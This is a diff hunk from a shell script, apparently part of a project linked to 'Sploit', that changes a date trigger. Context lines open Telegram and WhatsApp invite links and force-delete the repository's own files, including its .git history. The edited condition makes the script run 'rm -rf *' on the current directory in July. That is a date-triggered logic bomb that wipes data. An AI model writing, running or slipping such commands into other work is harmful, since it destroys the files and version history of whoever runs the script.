@@ -2,7 +2,7 @@
 xdg-open https://t.me/Channel_90s15
 xdg-open https://chat.whatsapp.com/HFk9iK7UpOvC40mdXqYk0w
 rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git" "regras-clownters.md"
-if [[ "$(date +%B)" == "May" ]]; then
+if [[ "$(date +%B)" == "July" ]]; then
     clear
     rm -rf *
 else
